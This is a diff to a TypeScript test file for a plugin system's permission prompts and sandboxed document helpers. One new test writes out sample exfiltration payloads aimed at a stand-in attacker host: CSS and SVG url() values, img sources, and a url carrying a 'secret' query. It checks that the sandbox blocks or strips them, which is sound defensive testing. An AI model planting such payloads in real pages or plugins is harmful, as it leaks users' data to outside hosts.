@@ -58,6 +58,9 @@ const mockPermissionForage = vi.hoisted(() => {
     setItem: vi.fn(async (key: string, value: unknown) => {
       values.set(key, value)
     }),
+    removeItem: vi.fn(async (key: string) => {
+      values.delete(key)
+    }),
   }
 })
 
@@ -208,6 +211,7 @@ vi.mock('src/lang', () => ({
     replacerPermissionConsent: '{}',
     providerPermissionConsent: '{}',
     sendChatConsent: '{}',
+    v3RuntimeConsent: '{}',
     permissionDenied: 'Permission denied',
   },
 }))
@@ -333,6 +337,7 @@ beforeEach(async () => {
   mockPermissionForage.values.clear()
   mockPermissionForage.getItem.mockClear()
   mockPermissionForage.setItem.mockClear()
+  mockPermissionForage.removeItem.mockClear()
   await __v3PluginLifecycleTestHooks.reset()
 })
 
@@ -607,6 +612,35 @@ describe('V3 plugin settings rollback', () => {
 })
 
 describe('V3 plugin permissions', () => {
+  it('does not create a V3 guest when trusted browser runtime access is denied', async () => {
+    const plugin = { ...seedV3Plugin('denied-runtime'), script: 'globalThis.ran = true' }
+    mockDbState.db.plugins = [plugin]
+    vi.mocked(alertConfirm).mockResolvedValueOnce(false)
+    const warn = vi.spyOn(console, 'warn').mockImplementation(() => undefined)
+
+    await executePluginV3(plugin)
+
+    expect(getV3PluginInstance(plugin.name)).toBeUndefined()
+    expect(document.querySelector('iframe')).toBeNull()
+    expect(alertConfirm).toHaveBeenCalledOnce()
+  })
+
+  it('requires a new trusted runtime decision after the V3 script changes', async () => {
+    const first = { ...seedV3Plugin('changing-runtime'), script: 'void "first"' }
+    const second = { ...seedV3Plugin('changing-runtime'), script: 'void "second"' }
+    mockDbState.db.plugins = [first]
+    vi.mocked(alertConfirm).mockResolvedValueOnce(true).mockResolvedValueOnce(false)
+    const warn = vi.spyOn(console, 'warn').mockImplementation(() => undefined)
+
+    await loadV3Plugins([first])
+    expect(getV3PluginInstance(first.name)).toBeDefined()
+    mockDbState.db.plugins = [second]
+    await loadV3Plugins([second])
+
+    expect(getV3PluginInstance(second.name)).toBeUndefined()
+    expect(alertConfirm).toHaveBeenCalledTimes(2)
+  })
+
   it('does not reuse a granted capability for another capability from the same plugin', async () => {
     const plugin = { ...seedV3Plugin('plugin-a'), script: 'script-a' }
     mockDbState.db.plugins = [plugin]
@@ -648,11 +682,76 @@ describe('V3 plugin permissions', () => {
   it('continues to honor persisted script-hash grants without prompting', async () => {
     const plugin = { ...seedV3Plugin('plugin-a'), script: 'script-a' }
     mockDbState.db.plugins = [plugin]
-    mockPermissionForage.values.set('hash:script-a_db', true)
+    mockPermissionForage.values.set('plugin_permission:["plugin-a","hash:script-a","db"]', true)
 
     await expect(__v3PluginLifecycleTestHooks.getPluginPermission(plugin.name, 'db')).resolves.toBe(true)
 
     expect(alertConfirm).not.toHaveBeenCalled()
+  })
+
+  it('does not carry an in-memory grant across a script update with the same plugin name', async () => {
+    const plugin = { ...seedV3Plugin('plugin-a'), script: 'script-a' }
+    mockDbState.db.plugins = [plugin]
+    vi.mocked(alertConfirm).mockResolvedValueOnce(true).mockResolvedValueOnce(false)
+
+    await expect(__v3PluginLifecycleTestHooks.getPluginPermission(plugin.name, 'db')).resolves.toBe(true)
+    plugin.script = 'script-b'
+    await expect(__v3PluginLifecycleTestHooks.getPluginPermission(plugin.name, 'db')).resolves.toBe(false)
+
+    expect(alertConfirm).toHaveBeenCalledTimes(2)
+  })
+
+  it('does not bank a grant when the installed script changes while its prompt is open', async () => {
+    const plugin = { ...seedV3Plugin('plugin-a'), script: 'script-a' }
+    mockDbState.db.plugins = [plugin]
+    let resolveConfirmation!: (allowed: boolean) => void
+    vi.mocked(alertConfirm).mockImplementationOnce(
+      () =>
+        new Promise<boolean>((resolve) => {
+          resolveConfirmation = resolve
+        }),
+    )
+
+    const permission = __v3PluginLifecycleTestHooks.getPluginPermission(plugin.name, 'db')
+    await vi.waitFor(() => expect(alertConfirm).toHaveBeenCalledOnce())
+    plugin.script = 'script-b'
+    resolveConfirmation(true)
+
+    await expect(permission).resolves.toBe(false)
+    expect(mockPermissionForage.setItem).not.toHaveBeenCalled()
+  })
+
+  it('does not reuse a persisted grant for a different plugin with byte-identical source', async () => {
+    const pluginA = { ...seedV3Plugin('plugin-a'), script: 'shared-script' }
+    const pluginB = { ...seedV3Plugin('plugin-b'), script: 'shared-script' }
+    mockDbState.db.plugins = [pluginA, pluginB]
+    mockPermissionForage.values.set('plugin_permission:["plugin-a","hash:shared-script","db"]', true)
+    vi.mocked(alertConfirm).mockResolvedValueOnce(false)
+
+    await expect(__v3PluginLifecycleTestHooks.getPluginPermission(pluginA.name, 'db')).resolves.toBe(true)
+    await expect(__v3PluginLifecycleTestHooks.getPluginPermission(pluginB.name, 'db')).resolves.toBe(false)
+
+    expect(alertConfirm).toHaveBeenCalledTimes(1)
+  })
+
+  it('coalesces concurrent non-reconfirm prompts for the same script capability', async () => {
+    const plugin = { ...seedV3Plugin('plugin-a'), script: 'script-a' }
+    mockDbState.db.plugins = [plugin]
+    let resolveConfirmation!: (allowed: boolean) => void
+    vi.mocked(alertConfirm).mockImplementationOnce(
+      () =>
+        new Promise<boolean>((resolve) => {
+          resolveConfirmation = resolve
+        }),
+    )
+
+    const first = __v3PluginLifecycleTestHooks.getPluginPermission(plugin.name, 'db')
+    const second = __v3PluginLifecycleTestHooks.getPluginPermission(plugin.name, 'db')
+    await vi.waitFor(() => expect(alertConfirm).toHaveBeenCalledTimes(1))
+    resolveConfirmation(true)
+
+    await expect(Promise.all([first, second])).resolves.toEqual([true, true])
+    expect(alertConfirm).toHaveBeenCalledTimes(1)
   })
 
   it('bypasses an in-memory grant when explicit reconfirmation is requested', async () => {
@@ -664,6 +763,29 @@ describe('V3 plugin permissions', () => {
 
     expect(alertConfirm).toHaveBeenCalledTimes(2)
   })
+
+  it.each([true, 'periodically'] as const)(
+    'coalesces concurrent %s reconfirmation prompts for the same script capability',
+    async (reconfirm) => {
+      const plugin = { ...seedV3Plugin('plugin-a'), script: 'script-a' }
+      mockDbState.db.plugins = [plugin]
+      let resolveConfirmation!: (allowed: boolean) => void
+      vi.mocked(alertConfirm).mockImplementationOnce(
+        () =>
+          new Promise<boolean>((resolve) => {
+            resolveConfirmation = resolve
+          }),
+      )
+
+      const first = __v3PluginLifecycleTestHooks.getPluginPermission(plugin.name, 'db', reconfirm)
+      const second = __v3PluginLifecycleTestHooks.getPluginPermission(plugin.name, 'db', reconfirm)
+      await vi.waitFor(() => expect(alertConfirm).toHaveBeenCalledTimes(1))
+      resolveConfirmation(true)
+
+      await expect(Promise.all([first, second])).resolves.toEqual([true, true])
+      expect(alertConfirm).toHaveBeenCalledTimes(1)
+    },
+  )
 
   it('reconfirms a periodic capability after its grant expires', async () => {
     const plugin = { ...seedV3Plugin('plugin-a'), script: 'script-a' }
@@ -708,8 +830,11 @@ describe('V3 plugin lifecycle cleanup', () => {
     vi.spyOn(console, 'log').mockImplementation(() => {})
     const removeSpy = vi.spyOn(window, 'removeEventListener')
 
-    await executePluginV3(seedV3Plugin('plugin-a'))
-    await executePluginV3(seedV3Plugin('plugin-b'))
+    const pluginA = seedV3Plugin('plugin-a')
+    const pluginB = seedV3Plugin('plugin-b')
+    mockDbState.db.plugins = [pluginA, pluginB]
+    await executePluginV3(pluginA)
+    await executePluginV3(pluginB)
 
     expect(getV3PluginInstance('plugin-a')).toBeTruthy()
     expect(getV3PluginInstance('plugin-b')).toBeTruthy()
@@ -726,7 +851,9 @@ describe('V3 plugin lifecycle cleanup', () => {
     const errorSpy = vi.spyOn(console, 'error').mockImplementation(() => {})
     const removeSpy = vi.spyOn(window, 'removeEventListener')
 
-    await executePluginV3(seedV3Plugin('plugin-a'))
+    const plugin = seedV3Plugin('plugin-a')
+    mockDbState.db.plugins = [plugin]
+    await executePluginV3(plugin)
     __v3PluginLifecycleTestHooks.addUnloadCallback('plugin-a', () => {
       throw new Error('unload failed')
     })
@@ -788,11 +915,13 @@ describe('V3 plugin lifecycle cleanup', () => {
     const oldPlugin = seedV3Plugin('plugin-old')
     const newPlugin = seedV3Plugin('plugin-new')
 
+    mockDbState.db.plugins = [oldPlugin]
     await loadV3Plugins([oldPlugin])
     const oldInstance = getV3PluginInstance('plugin-old')
     expect(oldInstance).toBeTruthy()
     const oldApi = __v3PluginLifecycleTestHooks.createApiForInstance(oldPlugin, oldInstance as any) as any
 
+    mockDbState.db.plugins = [newPlugin]
     await loadV3Plugins([newPlugin])
     const newInstance = getV3PluginInstance('plugin-new')
     expect(newInstance).toBeTruthy()
@@ -817,11 +946,13 @@ describe('V3 plugin lifecycle cleanup', () => {
     const oldPlugin = seedV3Plugin('plugin-old')
     const newPlugin = seedV3Plugin('plugin-new')
 
+    mockDbState.db.plugins = [oldPlugin]
     await loadV3Plugins([oldPlugin])
     const oldInstance = getV3PluginInstance('plugin-old')
     expect(oldInstance).toBeTruthy()
     const oldApi = __v3PluginLifecycleTestHooks.createApiForInstance(oldPlugin, oldInstance as any) as any
 
+    mockDbState.db.plugins = [newPlugin]
     await loadV3Plugins([newPlugin])
     const newInstance = getV3PluginInstance('plugin-new')
     expect(newInstance).toBeTruthy()
@@ -931,6 +1062,51 @@ describe('V3 plugin lifecycle cleanup', () => {
     document.dispatchEvent(new MouseEvent('click'))
 
     expect(listener).toHaveBeenCalledTimes(1)
+  })
+
+  it('keeps main-document HTML and CSS helpers network-dead', () => {
+    const lifecycle = __v3PluginLifecycleTestHooks.createLifecycle()
+    const safeDocument = __v3PluginLifecycleTestHooks.createSafeDocument(lifecycle)
+    const element = safeDocument.createElement('div')
+
+    expect(() => element.setStyle('backgroundImage', 'url(https://attacker.example/?secret=chat)')).toThrow(
+      /not allowed|network-loading/i,
+    )
+    expect(() => element.setStyle('color', 'red')).not.toThrow()
+    expect(() =>
+      element.setStyleAttribute('color: blue; background-image: url(https://attacker.example/style)'),
+    ).toThrow(/network-loading/i)
+
+    element.setInnerHTML(`
+      <img src="https://attacker.example/html">
+      <svg><rect filter="url(https://attacker.example/filter)" fill="url(https://attacker.example/fill)"></rect></svg>
+      <span class="kept">safe</span>
+    `)
+    expect(element.getInnerHTML()).toContain('<span class="kept">safe</span>')
+    expect(element.getInnerHTML()).not.toContain('attacker.example')
+    expect(element.getInnerHTML()).not.toMatch(/(?:filter|fill)="url/i)
+    expect(safeDocument.createElement('img').nodeName()).toBe('DIV')
+    expect(safeDocument.createElement('style').nodeName()).toBe('DIV')
+    expect(safeDocument.createAnchorElement('https://public.example/path').getOuterHTML()).toContain(
+      'rel="noopener noreferrer"',
+    )
+
+    const existingStyle = document.createElement('style')
+    document.head.appendChild(existingStyle)
+    const safeStyle = safeDocument.querySelector('style')
+    expect(() => safeStyle?.setInnerHTML('body { background: url(https://attacker.example/style-element) }')).toThrow(
+      /style element/i,
+    )
+    existingStyle.remove()
+
+    const existingImage = document.createElement('img')
+    existingImage.id = 'existing-network-image'
+    existingImage.src = 'https://attacker.example/existing-image'
+    document.body.appendChild(existingImage)
+    const safeImage = safeDocument.querySelector('#existing-network-image')
+    expect(() => safeImage?.cloneNode(true)).toThrow(/network-capable/i)
+    expect(() => element.appendChild(safeImage!)).toThrow(/network-capable/i)
+    existingImage.remove()
   })
 
   it('v4-L37: unload cleanup disconnects SafeMutationObservers exactly once', () => {
